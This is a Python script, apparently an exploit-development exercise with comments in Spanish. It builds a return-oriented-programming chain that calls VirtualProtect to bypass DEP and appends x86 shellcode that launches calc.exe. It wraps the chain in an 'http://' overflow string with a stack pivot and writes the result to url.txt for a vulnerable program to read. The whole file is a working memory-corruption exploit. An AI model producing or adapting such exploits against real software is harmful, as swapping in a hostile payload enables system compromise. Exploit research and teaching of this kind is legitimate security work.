# -*- coding: utf-8 -*-
import os, subprocess
import struct

#0x00406158 : kernel32!virtualprotect
#BOOL VirtualProtect( 
#  [in]  LPVOID lpAddress,
#  [in]  SIZE_T dwSize, 
#  [in]  DWORD  flNewProtect,
#  [out] PDWORD lpflOldProtect
#);

rop  = struct.pack('<L',0x77388805) # POP EAX # RETN
rop += struct.pack('<L',0x90d0f1e8) 
rop += struct.pack('<L',0x769f0bd2) # POP ESI # RETN 
rop += struct.pack('<L',0x90909090)
rop += struct.pack('<L',0x769f0bd0) # SUB EAX,ESI # POP ESI # RETN  
rop += struct.pack('<L',0x75b2a296) # NOP 
rop += struct.pack('<L',0x778811c2) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x778a60c3) # XCHG EAX,ESI # RETN 
#EBP
rop +=struct.pack('<L',0x77378836)  # POP EBP # RETN
rop +=struct.pack('<L',0x75bb4655)  # call e<sp 
#EBX
rop += struct.pack('<L',0x769ff352) # POP EBX # RETN 
rop += struct.pack('<L',0xfffffcff) # 301->NEG -> 0xfffffcff
rop += struct.pack('<L',0x769c062e) # XOR EAX,EAX # RETN 
rop += struct.pack('<L',0x77337926) # XCHG EAX,EBX # RETN 
rop += struct.pack('<L',0x769f3798) # NEG EAX # RETN
rop += struct.pack('<L',0x77337926) # XCHG EAX,EBX # RETN
rop += struct.pack('<L',0x769c062e) # XOR EAX,EAX # RETN 0
#EDX
rop += struct.pack('<L',0x769c062e) # XOR EAX,EAX # RETN
rop += struct.pack('<L',0x77897cc2) # POP EDX # RETN
rop += struct.pack('<L',0xffffffc0) # NEG -> 40
rop += struct.pack('<L',0x7780f282) # XCHG EAX,EDX # RETN 
rop += struct.pack('<L',0x769f3798) # NEG EAX # RETN
rop += struct.pack('<L',0x7780f282) # XCHG EAX,EDX # RETN 
rop += struct.pack('<L',0x769c062e) # XOR EAX,EAX # RETN
#ECX
rop += struct.pack('<L',0x7734f7a6) # POP ECX # RETN
rop += struct.pack('<L',0x9050298D) # 0x9050298D
rop += struct.pack('<L',0x77388805) # POP EAX # RETN
rop += struct.pack('<L',0x90909090)
rop += struct.pack('<L',0x773a985a) # SUB EAX,ECX # RETN 
rop += struct.pack('<L',0x773a96e8) # ADD EAX,1 #aÃ±adimos 1 a EAX para compensar el DEC ECX
rop += struct.pack('<L',0x778dce54) # XCHG EAX,ECX # CLC # DEC ECX # RETN 0x24
rop += struct.pack('<L',0x75b2a296) # NOP #Compensamos RETN 0X24 con NOP-RETN
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
rop += struct.pack('<L',0x75b2a296) # NOP #RETN 
#EDI
rop +=struct.pack('<L',0x77896729)  # POP EDI # RETN
rop +=struct.pack('<L',0x769f379a)  # RETN (ROP NOP) 
#EAX      
rop +=struct.pack('<L',0x75c8b748)  # POP EAX # RETN
rop +=struct.pack('<L',0x90909090)  # nop
#PUSHAD      
rop +=struct.pack('<L',0x77376f67)  # PUSHAD # RETN 
#FIN ROP#
opcodes  = "\x90"*20
opcodes += "\x90\x90\x90\x90\x90" #5 + 195 shellcode alinear

opcodes += "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
opcodes += "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
opcodes += "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
opcodes += "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
opcodes += "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
opcodes += "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
opcodes += "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
opcodes += "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
opcodes += "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
opcodes += "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
opcodes += "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
opcodes += "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
opcodes += "\x52\xff\xd0" #195

exit_0  = "\x43\x43\x43\x43"
exit_0 += "\x43\x43\x43\x43"

http   = "http://"
http  += "\x41" * 13 #13 EAX - 4 bytes return
http  += "\x00\x00\x00\x00" #NULL FCLOSE()

payload  = "\x42\x42\x42\x42"
payload += "\x42\x42\x42\x42"

#EBP
ebp  = struct.pack('<L',0x0065fc68) #EBP

#EIP
#PIVOT STACK creamos un stack falso para volver al buffer no vulnerable
esp  = struct.pack('<L',0x77898381) # XCHG EAX,EBP # RETN
esp += struct.pack('<L',0x77387b7f) # XCHG EAX,ESP # RETN  
esp += struct.pack('<L',0x77898381) # XCHG EAX,EBP # RETN

exploit=rop+opcodes+exit_0+http+payload+ebp+esp

file = open('url.txt','w')
file.write(exploit)
file.close()
